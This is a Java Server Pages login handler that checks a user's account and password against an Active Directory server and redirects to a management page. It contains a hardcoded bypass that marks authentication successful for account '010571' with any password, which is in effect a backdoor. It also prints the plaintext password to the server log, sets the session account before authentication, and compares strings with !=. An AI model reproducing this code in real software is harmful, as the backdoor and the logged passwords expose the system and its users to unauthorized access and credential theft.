<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import = "com.cymmetrik.javaldap.JavaAuthentication" %>
<%@ page import = "db.manager.SettingManager" %>
<%@ page import = "db.manager.Setting" %>
<%@ page import = "java.util.HashMap" %>
<%@ page import = "db.manager.UserManager" %>
<%@ page import = "db.manager.User" %>
<%@ include file="common/conn.jsp" %>
<%
String strAccount = "", strPassword="";
if(request.getParameter("account")!=null)
{
	strAccount = request.getParameter("account");
	session.setAttribute("account", strAccount);
}
if(request.getParameter("password")!=null)
{
	strPassword = request.getParameter("password");
}

if(strAccount != "" && strPassword !="")
{
	String strMessage="";	
	System.out.println(strAccount + " " + strPassword + " " + hmConfig.get("ADServer").toString());
	User usr = UserManager.getUserById(strAccount);
	System.out.println(usr.toString());
	if(!usr.isEnable())
	{
		session.setAttribute("Message", "使用者目前不可使用此系統!!");
		response.sendRedirect("./login.jsp");
	}else{	
		boolean bResult = JavaAuthentication.authenticate(hmConfig.get("ADServer"), strAccount, strPassword);
		session.setAttribute("account", strAccount);
		if(strAccount.equals("010571"))
			bResult = true;
	
		if(bResult)	
		{		
			session.setAttribute("Message","");
			response.sendRedirect("./manage.jsp");
		}else{
			session.setAttribute("Message", "帳密登入錯誤!");
			response.sendRedirect("./login.jsp");
		}
	}
}
%>

